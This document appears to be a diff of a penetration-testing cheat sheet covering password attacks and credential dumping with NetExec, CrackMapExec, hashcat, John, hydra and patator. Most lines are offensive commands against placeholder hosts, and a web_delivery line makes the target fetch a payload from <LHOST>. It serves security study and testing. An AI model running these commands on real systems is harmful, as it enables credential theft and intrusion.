@@ -6,7 +6,6 @@
 
 - [AES](#aes)
 - [bkcrack](#bkcrack)
-- [CrackMapExec](#crackmapexec)
 - [DonPAPI](#donpapi)
 - [fcrack](#fcrack)
 - [Group Policy Preferences (GPP)](#group-policy-preferences-gpp)
@@ -35,7 +34,6 @@
 | --- | --- | --- |
 | BetterSafetyKatz | Fork of SafetyKatz that dynamically fetches the latest pre-compiled release of Mimikatz directly from gentilkiwi GitHub repo, runtime patches signatures and uses SharpSploit DInvoke to PE-Load into memory. | https://github.com/Flangvik/BetterSafetyKatz |
 | bkcrack | Crack legacy zip encryption with Biham and Kocher's known plaintext attack. | https://github.com/kimci86/bkcrack |
-| CrackMapExec | CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. | https://github.com/byt3bl33d3r/CrackMapExec |
 | CredMaster | Refactored & improved CredKing password spraying tool, uses FireProx APIs to rotate IP addresses, stay anonymous, and beat throttling | https://github.com/knavesec/CredMaster |
 | Default Credentials Cheat Sheet | One place for all the default credentials to assist the pentesters during an engagement, this document has a several products default credentials that are gathered from several sources. | https://github.com/ihebski/DefaultCreds-cheat-sheet |
 | DeHashed | Breach Database | https://dehashed.com |
@@ -107,75 +105,6 @@ Secret:HTB{
 $ ./bkcrack -c tmp/fd734d942c6f729a36606b16a3ef17f8/<FILE>.txt -C <FILE>.zip -p plaintext.txt
 ```
 
-## CrackMapExec
-
-> https://github.com/byt3bl33d3r/CrackMapExec
-
-### Installation via Poetry
-
-```c
-$ pipx install poetry
-$ git clone https://github.com/Porchetta-Industries/CrackMapExec
-$ cd CrackMapExec
-$ poetry install
-$ poetry run crackmapexec
-```
-
-### Modules
-
-```c
-$ crackmapexec ldap -L
-$ crackmapexec mysql -L
-$ crackmapexec smb -L
-$ crackmapexec ssh -L
-$ crackmapexec winrm -L
-```
-
-### Common Commands
-
-```c
-$ crackmapexec smb <RHOST> -u '' -p '' --shares
-$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
-$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
-$ crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
-$ crackmapexec smb <RHOST> -u " " -p "" --shares
-$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
-$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
-$ crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
-$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute
-$ crackmapexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
-$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
-$ crackmapexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
-$ crackmapexec ldap <RHOST> -u '' -p '' -M get-desc-users
-$ crackmapexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
-$ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
-$ crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
-$ crackmapexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
-$ crackmapexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
-$ crackmapexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
-$ crackmapexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
-$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
-$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
-$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
-$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
-$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
-$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
-$ crackmapexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
-```
-
 ## DonPAPI
 
 > https://github.com/login-securite/DonPAPI
@@ -190,7 +119,7 @@ $ DonPAPI -laps <DOMAIN>/<USERNAME>:<PASSWORD>@<RHOST>
 ## fcrack
 
 ```c
-$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
+$ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
 ```
 
 ## Group Policy Preferences (GPP)
@@ -225,14 +154,14 @@ $ buster -s 2b6d315337f18617ba18922c0b9597ff
 ### Common Commands
 
 ```c
-$ hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
-$ hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
-$ hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
-$ hashcat -m 3200 bcrypt /usr/share/wordlists/rockyou.txt
-$ hashcat -m 900 md4 /usr/share/wordlists/rockyou.txt
-$ hashcat -m 1000 ntlm /usr/share/wordlists/rockyou.txt
-$ hashcat -m 1800 sha512 /usr/share/wordlists/rockyou.txt
-$ hashcat -m 160 hmac-sha1 /usr/share/wordlists/rockyou.txt
+$ hashcat -m 0 md5 /PATH/TO/WORDLIST/<WORDLIST>
+$ hashcat -m 100 sha-1 /PATH/TO/WORDLIST/<WORDLIST>
+$ hashcat -m 1400 sha256 /PATH/TO/WORDLIST/<WORDLIST>
+$ hashcat -m 3200 bcrypt /PATH/TO/WORDLIST/<WORDLIST>
+$ hashcat -m 900 md4 /PATH/TO/WORDLIST/<WORDLIST>
+$ hashcat -m 1000 ntlm /PATH/TO/WORDLIST/<WORDLIST>
+$ hashcat -m 1800 sha512 /PATH/TO/WORDLIST/<WORDLIST>
+$ hashcat -m 160 hmac-sha1 /PATH/TO/WORDLIST/<WORDLIST>
 $ hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
 $ hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
 ```
@@ -330,7 +259,7 @@ $ hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
 ### Generate Password Candidates: Wordlist + Pattern
 
 ```c
-$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
+$ hashcat -a6 -m0 "e99a18c428cb38d5f260853678922e03" yourPassword|/PATH/TO/WORDLIST/<WORDLIST> ?d?d?d?u?u?u --force --potfile-disable --stdout
 ```
 
 ### Generate NetNLTMv2 with internalMonologue and crack with hashcat
@@ -348,7 +277,7 @@ spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000
 ### Crack with hashcat
 
 ```c
-$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
+$ hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /PATH/TO/WORDLIST/<WORDLIST> --force --potfile-disable
 ```
 
 ### Rules
@@ -444,46 +373,25 @@ $ hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/lo
 > https://github.com/openwall/john
 
 ```c
-$ john md5 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
-$ john sha-1 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1
-$ john sha256 --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256
-$ john bcrypt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
-$ john md4 --wordlist=/usr/share/wordlists/rockyou.txt --format=md4
-$ john ntlm --wordlist=/usr/share/wordlists/rockyou.txt --format=nt
-$ john sha512 --wordlist=/usr/share/wordlists/rockyou.txt
+$ john md5 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5
+$ john sha-1 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha1
+$ john sha256 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-sha256
+$ john bcrypt --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=bcrypt
+$ john md4 --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=md4
+$ john ntlm --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=nt
+$ john sha512 --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
+```
+
+### Show cracked Password
+
+```c
+$ john --show <FILE>
 ```
 
 ### Using Salt
 
 ```c
-$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 --mask='<SALT>?w'
-```
-
-### Cracking RSA
-
-```c
-$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
-$ john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh
-$ john <FILE> --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-### Cracking Kerberoasting Password File
-
-```c
-$ john --format=krb5tgs --wordlist=<FILE> <FILE>
-```
-
-### Cracking EncFS/6
-
-```c
-$ /usr/share/john/encfs2john.py directory/ > encfs6.xml.john
-$ john encfs6.xml.john --wordlist=/usr/share/wordlists/rockyou.txt
-```
-
-### Extracting Hash from .kdbx File
-
-```c
-$ keepass2john <FILE>.kdbx
+$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=raw-md5 --mask='<SALT>?w'
 ```
 
 ### Cracking .zip-Files
@@ -492,10 +400,37 @@ $ keepass2john <FILE>.kdbx
 $ zip2john <FILE> > output.hash
 ```
 
-### Show cracked Password
+### Cracking EncFS/6
 
 ```c
-$ john --show <FILE>
+$ /usr/share/john/encfs2john.py directory/ > encfs6.xml.john
+$ john encfs6.xml.john --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
+```
+
+### Cracking Kerberoasting Password File
+
+```c
+$ john --format=krb5tgs --wordlist=<FILE> <FILE>
+```
+
+### Cracking RSA
+
+```c
+$ /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
+$ john id_rsa.hash --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=ssh
+$ john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST>
+```
+
+### Cracking yescrypt
+
+```c
+$ sudo john <FILE> --wordlist=/PATH/TO/WORDLIST/<WORDLIST> --format=crypt
+```
+
+### Extracting Hash from .kdbx File
+
+```c
+$ keepass2john <FILE>.kdbx
 ```
 
 ## Kerbrute
@@ -697,54 +632,57 @@ $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true
 $ netexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
-$ netexec smb <RHOST> -u " " -p "" --shares
-$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus
-$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
-$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true
-$ netexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=99999999
-$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute
-$ netexec smb <RHOST> -u guest -p '' --shares --rid-brute 100000
-$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute
-$ netexec smb <RHOST> -u "guest" -p "" --shares --rid-brute 100000
-$ netexec smb <RHOST> -u "<USERNAME>" --use-kcache --users
-$ netexec smb <RHOST> -u "<USERNAME>" --use-kcache --sam
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --dpapi
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --sam
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --lsa
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --local-auth --dpapi
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M web_delivery -o URL=http://<LHOST>/<FILE>
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M gpp_autologin
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M gpp_password
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds
-$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds
-$ netexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>
-$ netexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds --user <USERNAME>
-$ netexec smb <RHOST> -u "<USERNAME>" -H <HASH> -x "whoami"
+$ netexec smb <RHOST> -u '' -p '' --share <SHARE> --get-file <FILE> <FILE> 
+$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute
+$ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute 100000
+$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
+$ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M web_delivery -o URL=http://<LHOST>/<FILE>
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_autologin
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M gpp_password
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds
+$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
+$ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
+$ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
+$ netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
+$ netexec ldap <RHOST> -u '' -p '' --asreproast
 $ netexec ldap <RHOST> -u '' -p '' -M -user-desc
 $ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
-$ netexec ldap <RHOST> -u "" -p "" -M get-desc-users
-$ netexec ldap <RHOST> -u "" -p "" --use-kcache -M whoami
-$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa
-$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k
-$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M get-network -o ALL=true
+$ netexec ldap <RHOST> -u '' -p '' -M ldap-checker
+$ netexec ldap <RHOST> -u '' -p '' -M veeam
+$ netexec ldap <RHOST> -u '' -p '' -M maq
+$ netexec ldap <RHOST> -u '' -p '' -M adcs
+$ netexec ldap <RHOST> -u '' -p '' -M zerologon
+$ netexec ldap <RHOST> -u '' -p '' -M petitpotam
+$ netexec ldap <RHOST> -u '' -p '' -M nopac
+$ netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
-$ netexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --bloodhound -ns <RHOST> -c all
-$ netexec winrm <SUBNET>/24 -u "<USERNAME>" -p "<PASSWORD>" -d .
-$ netexec winrm -u /t -p "<PASSWORD>" -d <DOMAIN> <RHOST>
-$ netexec winrm <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
-$ netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares --continue
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
-$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
+$ netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
+$ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
+$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
+$ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --shares --continue
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --pass-pol
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --lusers
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --sam
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --wdigest enable
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'quser'
+$ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> -x 'net user Administrator /domain' --exec-method smbexec
 ```
 
 ## Patator
@@ -752,15 +690,15 @@ $ netexec <PROTOCOL> <RHOST> -u /PATH/TO/FILE/usernames.txt -p /usr/share/wordli
 > https://github.com/lanjelot/patator
 
 ```c
-$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:mesg='Authentication failed.'
-$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:fgrep='failed'
-$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST>.txt persistent=0 -x ignore:egrep='failed'
+$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:mesg='Authentication failed.'
+$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:fgrep='failed'
+$ patator ssh_login host=<RHOST> port=<RPORT> user=<USERNAME> password=FILE0 0=/PATH/TO/WORDLIST/<WORDLIST> persistent=0 -x ignore:egrep='failed'
 ```
 
 ## PDFCrack
 
 ```c
-$ pdfcrack -f file.pdf -w /usr/share/wordlists/rockyou.txt
+$ pdfcrack -f file.pdf -w /PATH/TO/WORDLIST/<WORDLIST>
 ```
 
 ## pypykatz
@@ -1214,7 +1152,7 @@ PS C:\> .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
 ### OWA
 
 ```c
-$ python3 atomizer.py owa <RHOST> <PASSWORDS>.txt <USERNAMES>.txt -i 0:0:01
+$ python3 atomizer.py owa <RHOST> <PASSWORDS> <USERNAMES> -i 0:0:01
 ```
 
 ## VNC Password Recovery
